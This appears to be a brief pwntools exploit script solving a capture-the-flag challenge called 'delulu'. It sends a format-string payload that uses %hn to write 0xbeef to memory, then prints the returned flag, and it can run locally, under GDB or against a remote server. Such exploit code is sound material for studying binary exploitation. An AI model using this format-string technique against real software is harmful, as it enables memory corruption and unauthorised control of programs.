#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug(
            [exe] + argv, gdbscript=gdbscript, *a, **kw
        )
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

exe = "./delulu_patched"
elf = context.binary = ELF(exe, checksec=False)

p = start()

payload = f"%{0xbeef}c%7$hn"

p.sendlineafter(b'>>', bytes(payload, 'latin-1'))
flag = p.recvall().strip().split()[-1].decode()
info("Flag: " + flag)
